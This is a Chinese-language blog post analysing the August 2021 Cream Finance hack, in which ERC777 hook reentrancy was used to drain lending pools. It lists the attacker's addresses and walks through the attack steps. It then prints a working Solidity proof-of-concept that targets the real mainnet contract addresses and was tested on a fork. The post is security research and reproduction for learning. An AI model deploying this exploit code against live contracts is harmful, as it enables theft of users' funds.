<!DOCTYPE html>
<html lang="en">
    <!-- title -->


    

<!-- keywords -->



<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="author" content="John Doe">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="John Doe">
    
        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
    
    <meta name="description" content="">
    <meta name="description" content="概述上个月8月30日， Cream Finance 又双叒叕遭到了攻击，损失超 1800 万美元。 漏洞原理用一句话概括：Cream的借贷经济模型未能考虑到ERC777Token的勾子函数所带来的重入风险 事件分析 攻击者地址 10xce1f4b4f17224ec6df16eeb1e3e5321c54ff6ede 其中一次攻击的交易哈希(既然大家都选这次分析我也选这次复现好了) 10xa9a1b8">
<meta property="og:type" content="article">
<meta property="og:title" content="Cream_8_30_Vul_Poc">
<meta property="og:url" content="http://example.com/2021/12/09/Cream-8-30-Vul-Poc/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="概述上个月8月30日， Cream Finance 又双叒叕遭到了攻击，损失超 1800 万美元。 漏洞原理用一句话概括：Cream的借贷经济模型未能考虑到ERC777Token的勾子函数所带来的重入风险 事件分析 攻击者地址 10xce1f4b4f17224ec6df16eeb1e3e5321c54ff6ede 其中一次攻击的交易哈希(既然大家都选这次分析我也选这次复现好了) 10xa9a1b8">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2021/12/09/Cream-8-30-Vul-Poc/images/step1.png">
<meta property="og:image" content="http://example.com/2021/12/09/Cream-8-30-Vul-Poc/images/step2.png">
<meta property="og:image" content="http://example.com/2021/12/09/Cream-8-30-Vul-Poc/images/step3.png">
<meta property="og:image" content="http://example.com/2021/12/09/Cream-8-30-Vul-Poc/images/step4.png">
<meta property="og:image" content="http://example.com/2021/12/09/Cream-8-30-Vul-Poc/images/step5-1.png">
<meta property="og:image" content="http://example.com/2021/12/09/Cream-8-30-Vul-Poc/images/step5-2.png">
<meta property="og:image" content="http://example.com/2021/12/09/Cream-8-30-Vul-Poc/images/step6.png">
<meta property="og:image" content="http://example.com/2021/12/09/Cream-8-30-Vul-Poc/images/step7.png">
<meta property="og:image" content="http://example.com/2021/12/09/Cream-8-30-Vul-Poc/images/step8.png">
<meta property="og:image" content="http://example.com/2021/12/09/Cream-8-30-Vul-Poc/images/step9.png">
<meta property="og:image" content="http://example.com/2021/12/09/Cream-8-30-Vul-Poc/images/suicide.png">
<meta property="og:image" content="http://example.com/2021/12/09/Cream-8-30-Vul-Poc/images/step10.png">
<meta property="og:image" content="http://example.com/2021/12/09/Cream-8-30-Vul-Poc/images/step11.png">
<meta property="og:image" content="http://example.com/2021/12/09/Cream-8-30-Vul-Poc/images/attack.png">
<meta property="og:image" content="http://example.com/2021/12/09/Cream-8-30-Vul-Poc/images/Before_Attack.png">
<meta property="og:image" content="http://example.com/2021/12/09/Cream-8-30-Vul-Poc/images/After_Attack.png">
<meta property="article:published_time" content="2021-12-09T08:26:49.000Z">
<meta property="article:modified_time" content="2021-12-09T08:30:31.364Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2021/12/09/Cream-8-30-Vul-Poc/images/step1.png">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="icon" href="/assets/favicon.ico">
    
    <title>Cream_8_30_Vul_Poc · W2Ning</title>
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
    (function (w) {
        'use strict'
        // rel=preload support test
        if (!w.loadCSS) {
            w.loadCSS = function () {}
        }
        // define on the loadCSS obj
        var rp = (loadCSS.relpreload = {})
        // rel=preload feature support test
        // runs once and returns a function for compat purposes
        rp.support = (function () {
            var ret
            try {
                ret = w.document.createElement('link').relList.supports('preload')
            } catch (e) {
                ret = false
            }
            return function () {
                return ret
            }
        })()

        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
        // then change that media back to its intended value on load
        rp.bindMediaToggle = function (link) {
            // remember existing media attr for ultimate state, or default to 'all'
            var finalMedia = link.media || 'all'

            function enableStylesheet() {
                link.media = finalMedia
            }

            // bind load handlers to enable media
            if (link.addEventListener) {
                link.addEventListener('load', enableStylesheet)
            } else if (link.attachEvent) {
                link.attachEvent('onload', enableStylesheet)
            }

            // Set rel and non-applicable media type to start an async request
            // note: timeout allows this to happen async to let rendering continue in IE
            setTimeout(function () {
                link.rel = 'stylesheet'
                link.media = 'only x'
            })
            // also enable media after 3 seconds,
            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
            setTimeout(enableStylesheet, 3000)
        }

        // loop through link elements in DOM
        rp.poly = function () {
            // double check this to prevent external calls from running
            if (rp.support()) {
                return
            }
            var links = w.document.getElementsByTagName('link')
            for (var i = 0; i < links.length; i++) {
                var link = links[i]
                // qualify links to those with rel=preload and as=style attrs
                if (
                    link.rel === 'preload' &&
                    link.getAttribute('as') === 'style' &&
                    !link.getAttribute('data-loadcss')
                ) {
                    // prevent rerunning on link
                    link.setAttribute('data-loadcss', true)
                    // bind listeners to toggle media back
                    rp.bindMediaToggle(link)
                }
            }
        }

        // if unsupported, run the polyfill
        if (!rp.support()) {
            // run once at least
            rp.poly()

            // rerun poly on an interval until onload
            var run = w.setInterval(rp.poly, 500)
            if (w.addEventListener) {
                w.addEventListener('load', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            } else if (w.attachEvent) {
                w.attachEvent('onload', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            }
        }

        // commonjs
        if (typeof exports !== 'undefined') {
            exports.loadCSS = loadCSS
        } else {
            w.loadCSS = loadCSS
        }
    })(typeof global !== 'undefined' ? global : this)
</script>

    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }
</style>

    <link rel="preload" href="/css/style.css?v=20210823" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="preload" href="/css/dark.css?v=20210823" as="style">
    <link rel="stylesheet" href="/css/dark.css" media="(prefers-color-scheme: dark)">
    <link rel="stylesheet" href="/css/mobile.css?v=20210823" media="(max-width: 960px)">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
    <link rel="preload" href="/scripts/main.js?v=20210823" as="script">
    <link rel="preload" href="/scripts/dark.js?v=20210823" as="script">
    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
    <!-- algolia -->
    
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
<meta name="generator" content="Hexo 5.4.0"></head>

    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ == undefined) {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js" />')
        }
    </script>
    
        <body class="post-body">
    
        <!-- header -->
        <header class="header header-mobile">
    <!-- top read progress line -->
    <div class="header-element">
        <div class="read-progress"></div>
    </div>
    <!-- sidebar menu button -->
    <div class="header-element">
        
            <div class="header-sidebar-menu">
        
            
                <div style="padding-left: 1px;">&#xe775;</div>
            
        </div>
    </div>
    <!-- header actions -->
    <div class="header-actions">
        <!-- theme mode switch button -->
        <span class="header-theme-btn header-element">
            <i class="fas fa-adjust"></i>
        </span>
        <!-- back to home page text -->
        <span class="home-link header-element">
            <a href=/>学</a>
        </span>
    </div>
    <!-- toggle banner for post layout -->
    
        
            <div class="banner">
        
            <div class="blog-title header-element">
                <a href="/">学</a>
            </div>
            <div class="post-title header-element">
                <a href="#" class="post-name">Cream_8_30_Vul_Poc</a>
            </div>
        </div>
    
</header>

        <!-- fixed footer -->
        <footer class="footer-fixed">
    <!-- back to top button -->
    <div class="footer-fixed-element">
        
            <div class="back-top back-top-hidden">
        
        
            <div>&#xe639;</div>
        
        </div>
    </div>
</footer>

        <!-- wrapper -->
        <div class="wrapper">
            <div class="site-intro" style="







    height:50vh;

">
    
    <!-- 主页  -->
    
        
    <!-- 404页  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
                Cream_8_30_Vul_Poc
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
                
            <!-- 404 -->
            
        </p>
        <!-- 文章页 meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                
                    <div class="post-intro-read">
                        <span>Word count: <span class="post-count word-count">4.4k</span>Reading time: <span class="post-count reading-time">24 min</span></span>
                    </div>
                
                <div class="post-intro-meta">
                    <!-- 撰写日期 -->
                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
                    <span class="post-intro-time">2021/12/09</span>
                    <!-- busuanzi -->
                    
                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    
                    <!-- 文章分享 -->
                    <span class="share-wrapper">
                        <span class="iconfont-archer share-icon">&#xe71d;</span>
                        <span class="share-text">Share</span>
                        <ul class="share-list">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>

            <script>
  // get user agent
  function getBrowserVersions() {
    var u = window.navigator.userAgent
    return {
      userAgent: u,
      trident: u.indexOf('Trident') > -1, //IE内核
      presto: u.indexOf('Presto') > -1, //opera内核
      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
      iPad: u.indexOf('iPad') > -1, //是否为iPad
      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
    }
  }
  var browser = {
    versions: getBrowserVersions(),
  }
  console.log('userAgent: ' + browser.versions.userAgent)

  // callback
  function fontLoaded() {
    console.log('font loaded')
    if (document.getElementsByClassName('site-intro-meta')) {
      document
        .getElementsByClassName('intro-title')[0]
        .classList.add('intro-fade-in')
      document
        .getElementsByClassName('intro-subtitle')[0]
        .classList.add('intro-fade-in')
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in')
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb() {
    if (browser.versions.uc) {
      console.log('UCBrowser')
      fontLoaded()
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular'],
        },
        loading: function () {
          // 所有字体开始加载
          // console.log('font loading');
        },
        active: function () {
          // 所有字体已渲染
          fontLoaded()
        },
        inactive: function () {
          // 字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout')
          fontLoaded()
        },
        timeout: 5000, // Set the timeout to two seconds
      })
    }
  }

  function asyncErr() {
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0]
    o.src = u
    if (cb) {
      o.addEventListener(
        'load',
        function (e) {
          cb(null, e)
        },
        false
      )
    }
    if (err) {
      o.addEventListener(
        'error',
        function (e) {
          err(null, e)
        },
        false
      )
    }
    s.parentNode.insertBefore(o, s)
  }

  var asyncLoadWithFallBack = function (arr, success, reject) {
    var currReject = function () {
      reject()
      arr.shift()
      if (arr.length) async(arr[0], success, currReject)
    }

    async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack(
    [
      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
      "/lib/webfontloader.min.js",
    ],
    asyncCb,
    asyncErr
  )
</script>

            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
            <div class="container container-unloaded">
                <main class="main post-page">
    <article class="article-entry">
        <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>上个月8月30日， Cream Finance 又双叒叕遭到了攻击，损失超 1800 万美元。</p>
<p>漏洞原理用一句话概括：<code>Cream的借贷经济模型未能考虑到ERC777Token的勾子函数所带来的重入风险</code></p>
<h2 id="事件分析"><a href="#事件分析" class="headerlink" title="事件分析"></a>事件分析</h2><ul>
<li><p>攻击者地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xce1f4b4f17224ec6df16eeb1e3e5321c54ff6ede</span><br></pre></td></tr></table></figure></li>
<li><p>其中一次攻击的交易哈希(既然大家都选这次分析我也选这次复现好了)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xa9a1b8ea288eb9ad315088f17f7c7386b9989c95b4d13c81b69d5ddad7ffe61e</span><br></pre></td></tr></table></figure></li>
<li><p>该攻击发生的块高度</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">13125071 </span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="攻击合约A"><a href="#攻击合约A" class="headerlink" title="攻击合约A"></a>攻击合约A</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x38c40427efbAAe566407e4CdE2A91947dF0bD22B</span><br></pre></td></tr></table></figure>

<h4 id="攻击合约B"><a href="#攻击合约B" class="headerlink" title="攻击合约B"></a>攻击合约B</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0ec306D7634314D35139d1dF4A630d829475A125</span><br></pre></td></tr></table></figure>

<h4 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h4><ul>
<li><p>第一步 在ERC1820地址上调用<code>setInterfaceImplementer</code>,完成<code>AmpTokensRecipient</code>勾子函数的注册<br><img src="./images/step1.png" alt="images"></p>
</li>
<li><p>第二步 攻击者从Uniswap通过<code>FlashSwap</code>借出500<code>WETH</code><br><img src="./images/step2.png" alt="images"></p>
</li>
<li><p>第三步 将500<code>WETH</code>换成500<code>ETH</code><br><img src="./images/step3.png" alt="images"></p>
</li>
<li><p>第四步 调用<code>crETH</code>的<code>mint</code>函数，将500<code>ETH</code>存入<code>crETH</code>获得借贷凭证<br><img src="./images/step4.png" alt="images"></p>
</li>
<li><p>第五步 用其借贷凭证借出<code>19480000</code>个<code>AMP</code>,并通过攻击合约A中的勾子函数，再次借出355个<code>ETH</code><br><img src="./images/step5-1.png" alt="images"><br><img src="./images/step5-2.png" alt="images"></p>
</li>
<li><p>第六步 攻击合约A生成一个新的合约<br><img src="./images/step6.png" alt="images"></p>
</li>
<li><p>第七步 攻击合约A把一半借到的<code>AMP</code>转入攻击合约B，用来清算原合约的部分<code>crETH</code>,<br><img src="./images/step7.png" alt="images"></p>
</li>
<li><p>第八步 攻击合约B清算攻击合约A的<code>crETH</code>赎回了约187个<code>ETH</code><br><img src="./images/step8.png" alt="images"></p>
</li>
<li><p>第九步 攻击合约B执行<code>SelfDestruct()</code>完成自毁，把约187个<code>ETH</code>转回攻击合约<br><img src="./images/step9.png" alt="images"><br><img src="./images/suicide.png" alt="images"></p>
</li>
<li><p>第十步 攻击合约A 把355个<code>ETH</code>转为355个<code>WETH</code>  返回给<code>Uniswap</code>501.55个<code>WETH</code>,完成闪电贷流程<br><img src="./images/step10.png" alt="images"></p>
</li>
<li><p>第十一步  攻击合约A把剩下的一半<code>AMP</code>和41个<code>WETH</code>转回攻击者得钱包地址<br><img src="./images/step11.png" alt="images"></p>
</li>
</ul>
<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><p>本次复现不是特别完美,没有加入攻击者的<code>清算逻辑</code>,而是把借出的AMP<code>全部抛售</code>,归还闪电贷结束攻击.</p>
<p>这也是第一次学习ERC777Token的Hook函数如何实现,光是踩坑就已经让我精疲力尽了.</p>
<p>同时我找一个abi转solidity的工具,再也不用手写interface了,但同时攻击代码也因为8个interface变得特别长.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gnidan.github.io/abi-to-sol/</span><br></pre></td></tr></table></figure>

<p>但我仍旧认为,单文件比引入外部文件要省事.</p>
<p>选择在高度为<code>13125070</code>的块上Fork,部署攻击合约</p>
<p>点击Attack</p>
<p><img src="./images/attack.png" alt="images"></p>
<p>攻击前的metamask余额</p>
<p><img src="./images/Before_Attack.png" alt="images"></p>
<p>攻击后的metamask余额</p>
<p><img src="./images/After_Attack.png" alt="images"></p>
<h4 id="核心攻击代码"><a href="#核心攻击代码" class="headerlink" title="核心攻击代码"></a>核心攻击代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">contract poc &#123;</span><br><span class="line"></span><br><span class="line">    address constant  AMPToken_Address = 0xfF20817765cB7f73d4bde2e66e067E58D11095C2;</span><br><span class="line"></span><br><span class="line">    address constant  registry = 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24;</span><br><span class="line"></span><br><span class="line">    //keccak256(&quot;AmpTokensRecipient&quot;)</span><br><span class="line">    bytes32 constant  TOKENS_RECIPIENT_INTERFACE_HASH = 0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a;</span><br><span class="line"></span><br><span class="line">    address constant uin_WTH9_Pair_Address = 0xd3d2E2692501A5c9Ca623199D38826e513033a17;</span><br><span class="line"></span><br><span class="line">    address constant WTH9_AMP_Pair_Address = 0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293;</span><br><span class="line"></span><br><span class="line">    address constant WETH9_Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;</span><br><span class="line"></span><br><span class="line">    address constant crETH_Address = 0xD06527D5e56A3495252A528C4987003b712860eE;</span><br><span class="line"></span><br><span class="line">    address constant crAMP_Address = 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6;</span><br><span class="line"></span><br><span class="line">    address constant UniswapV2Router02_address = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;</span><br><span class="line"></span><br><span class="line">    address public wallet;</span><br><span class="line"></span><br><span class="line">    ////这里必须是一个动态数组，根据uniswap的设计，该数组长度可能为2也可能为3</span><br><span class="line">    address[]  path = [0xfF20817765cB7f73d4bde2e66e067E58D11095C2,0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line"></span><br><span class="line">        //注册接口</span><br><span class="line">        IERC1820Registry(registry).setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));</span><br><span class="line"></span><br><span class="line">        wallet = msg.sender;</span><br><span class="line">        //触发FlashSwap</span><br><span class="line">        Uni_Pair_V2(uin_WTH9_Pair_Address).swap(0, 500*1e18, address(this), &quot;0x00&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external&#123;</span><br><span class="line"></span><br><span class="line">        //把500个WETH转为500个ETH</span><br><span class="line">        WETH9(WETH9_Address).withdraw(500*1e18);</span><br><span class="line"></span><br><span class="line">        //把500个ETH质押进Cream</span><br><span class="line">        crETH(crETH_Address).mint&#123;value:500*1e18&#125;();</span><br><span class="line"></span><br><span class="line">        //这里很奇怪要先借小额的ETH,才能借出大量的AMP,暂时不清楚原因</span><br><span class="line">        crETH(crETH_Address).borrow(1*1e18);</span><br><span class="line"></span><br><span class="line">        //攻击者调用了这个函数,所以我也跟着调</span><br><span class="line">        crAMP(crAMP_Address).accrueInterest();</span><br><span class="line"></span><br><span class="line">        //借大量AMP</span><br><span class="line">        crAMP(crAMP_Address).borrow(19480000000000000000000000);</span><br><span class="line"></span><br><span class="line">        //把所有ETH转为WETH</span><br><span class="line">        WETH9(WETH9_Address).deposit&#123;value:address(this).balance,gas:40000&#125;();</span><br><span class="line"></span><br><span class="line">        //Approve给RouterV2大量AMP,准备卖掉</span><br><span class="line">        AMP(AMPToken_Address).approve(UniswapV2Router02_address,19480000000000000000000000000);</span><br><span class="line"></span><br><span class="line">        //卖掉AMP</span><br><span class="line">        Uni_Router_V2(UniswapV2Router02_address).swapExactTokensForTokens(19480000000000000000000000,1,path,address(this),block.timestamp);</span><br><span class="line"></span><br><span class="line">        //归还FlashSwap</span><br><span class="line">        WETH9(WETH9_Address).transfer(uin_WTH9_Pair_Address,502*1e18);</span><br><span class="line"></span><br><span class="line">        //剩余WETH转回给测试账户</span><br><span class="line">        WETH9(WETH9_Address).transfer(wallet,WETH9(WETH9_Address).balanceOf(address(this)));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokensReceived(</span><br><span class="line">        bytes4 functionSig,</span><br><span class="line">        bytes32 partition,</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 value,</span><br><span class="line">        bytes calldata data,</span><br><span class="line">        bytes calldata operatorData</span><br><span class="line">    ) external  &#123;</span><br><span class="line">        // 当该攻击合约收到AMP的时候,触发钩子函数，通过重入借出ETH</span><br><span class="line">        crETH(crETH_Address).borrow(354*1e18);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="完整攻击代码"><a href="#完整攻击代码" class="headerlink" title="完整攻击代码"></a>完整攻击代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span 